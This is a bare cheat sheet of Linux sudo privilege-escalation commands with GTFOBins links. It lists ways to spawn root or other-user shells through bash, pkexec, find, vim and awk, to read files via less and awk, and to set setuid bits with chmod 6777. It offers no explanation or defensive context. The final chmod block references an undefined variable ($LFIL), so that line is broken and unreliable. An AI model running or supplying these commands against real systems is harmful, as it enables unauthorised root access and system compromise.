```
sudo -l
```

```
sudo -u $username /bin/bash
```

```
sudo -i
```

```
sudo su
```

```
sudo pkexec /bin/sh
```

```
sudo -u $username /usr/bin/find . -exec /bin/bash \; -quit
```

https://gtfobins.github.io/gtfobins/find/#sudo

```
sudo -u $username /usr/bin/vim -c ':!/bin/bash'
```

https://gtfobins.github.io/gtfobins/vim/#sudo

```
sudo -u $username /usr/bin/less $file
```

https://gtfobins.github.io/gtfobins/less/#sudo

```
sudo -u $username /usr/bin/awk '{print $0}' $file
```

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

https://gtfobins.github.io/gtfobins/awk/#sudo

```
LFILE=file_to_change
sudo chmod 6777 $LFIL
```

https://gtfobins.github.io/gtfobins/chmod/#sudo

